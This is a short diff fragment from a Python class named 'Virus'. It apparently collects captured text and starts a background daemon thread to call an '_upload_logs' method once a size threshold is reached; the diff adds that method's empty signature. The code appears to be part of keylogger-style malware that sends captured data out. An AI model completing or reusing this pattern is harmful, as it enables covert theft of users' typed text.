@@ -129,3 +129,5 @@ class Virus(object):
 
         if len("".join(self.texts)) >= self.MAX_TEXTS:
             threading.Thread(target=self._upload_logs, daemon=True).start()
+    
+    def _upload_logs(self):
